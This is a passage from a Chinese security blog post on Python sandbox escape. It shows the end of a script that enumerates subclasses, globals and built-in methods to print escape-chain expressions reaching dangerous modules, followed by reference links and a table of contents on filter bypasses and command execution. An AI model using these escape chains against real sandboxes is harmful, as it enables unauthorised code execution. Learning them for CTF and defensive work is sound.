------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 导入了危险模块的派生类</span><br><span class="line">for i, submodules in subclasses.items():</span><br><span class="line">    for submodule in submodules:</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method == submodule:</span><br><span class="line">                # print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span><br><span class="line">                print(&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 缓冲区 ------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 判断Python版本</span><br><span class="line">if (sys.version_info[0]) == 3:</span><br><span class="line">    modules = modules3</span><br><span class="line">else:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"># 导入了危险模块的标准库</span><br><span class="line">for module in modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    try:</span><br><span class="line">        m = __import__(module)  # 导入模块</span><br><span class="line">        attrs = dir(m)          # 获取属性与方法</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method in attrs: # 若存在危险模块</span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 导入标准库，间接导入危险模块 ------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 导入了危险标准库的派生类</span><br><span class="line">for i, submodules in subclasses.items():</span><br><span class="line">    for submodule in submodules:</span><br><span class="line">        for risk_module in risk_modules.keys():</span><br><span class="line">            if risk_module == submodule:</span><br><span class="line">                for method in risk_modules[risk_module]:</span><br><span class="line">                    # print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span><br><span class="line">                    print(&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 链式调用特殊方法------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 基本类型的特殊方法</span><br><span class="line">for t in types:</span><br><span class="line">    for method in dir(t):</span><br><span class="line">        # 待比较类型</span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        # Python2特殊类型</span><br><span class="line">        c2 = &quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span><br><span class="line">        # Python3特殊类型</span><br><span class="line">        c3 = &quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span><br><span class="line">        if c == c2 or c == c3:</span><br><span class="line">            # 转义双引号</span><br><span class="line">            if t == &#x27;&#x27;:</span><br><span class="line">                t = &quot;&#x27;&#x27;&quot;</span><br><span class="line">            print(&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;.format(t=t, method=method))</span><br></pre></td></tr></table></figure></div>

<p>参考文章：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#section" >https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#section <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" >https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> python沙箱逃逸</li>
        <li><strong>作者:</strong> GTL-JU</li>
        <li><strong>创建于:</strong> 2023-07-20 20:08:52</li>
        
            <li>
                <strong>更新于:</strong> 2023-07-20 20:17:28
            </li>
        
        <li>
            <strong>链接:</strong> https://gtl-ju.github.io/2023/07/20/python沙箱逃逸/
        </li>
        <li>
            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/python/">#python</a>&nbsp;
                        </li>
                    
                </ul>
            

            

            
                <div class="article-nav">
                    
                    
                        <div class="article-next">
                            <a class="next"
                            rel="next"
                            href="/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
                            >
                                <span class="title flex-center">
                                    <span class="post-nav-title-item">CommonCollections1利用链分析</span>
                                    <span class="post-nav-item">下一篇</span>
                                </span>
                                <span class="right arrow-icon flex-center">
                                    <i class="fa-solid fa-chevron-right"></i>
                                </span>
                            </a>
                        </div>
                    
                </div>
            


            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">python沙箱逃逸</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">python沙箱逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%85%B3%E4%BA%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">一、关于沙箱逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">二、如何沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-text">导入模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4"><span class="nav-text">各种过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">过滤字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤[]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict"><span class="nav-text">dict</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97"><span class="nav-text">过滤数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-text">过滤空格</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys-modules%E6%81%A2%E5%A4%8D"><span class="nav-text">sys.modules恢复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-text">内置模块的应用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E6%9E%84%E9%80%A0%E9%80%83%E9%80%B8%E9%93%BE%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8"><span class="nav-text">利用继承关系构造逃逸链进行逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#object%E7%9A%84%E5%AD%90%E7%B1%BB%E5%AF%BC%E5%85%A5%E5%8D%B1%E9%99%A9%E6%A8%A1%E5%9D%97"><span class="nav-text">object的子类导入危险模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#object%E5%AD%90%E7%B1%BB%E5%AF%BC%E5%85%A5%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95"><span class="nav-text">object子类导入危险方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E9%80%83%E9%80%B8"><span class="nav-text">利用异常逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8format"><span class="nav-text">利用format</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="nav-text">构造思路</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
            </div>
        
    </div>
</div>


                

            </div>
            
            

        </div>

        <div class="main-content-footer">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info">
            &copy;
            
              <span>2023</span>
              -
            
            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">GTL-JU</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
                <br>
            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.0</a>
        </div>
        
        
        
            <div id="start_div" style="display:none">
                2023/4/8 0:0:0
            </div>
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
        
            <script async data-pjax>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-expand-width flex-center">
            <i class="fa-regular fa-expand"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    


</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/layouts/navbarShrink.js"></script>

<script src="/js/tools/scrollTopBottom.js"></script>

<script src="/js/tools/lightDarkSwitch.js"></script>



    
<script src="/js/tools/localSearch.js"></script>




    
<script src="/js/tools/codeBlock.js"></script>




    
<script src="/js/layouts/lazyload.js"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/layouts/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js"></script>







<div class="post-scripts pjax">
    
        
<script src="/js/tools/tocToggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/layouts/toc.js"></script>

<script src="/js/plugins/tabs.js"></script>

    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            Global.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            Global.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            Global.refresh();
        });
    });
</script>




</body>
</html>
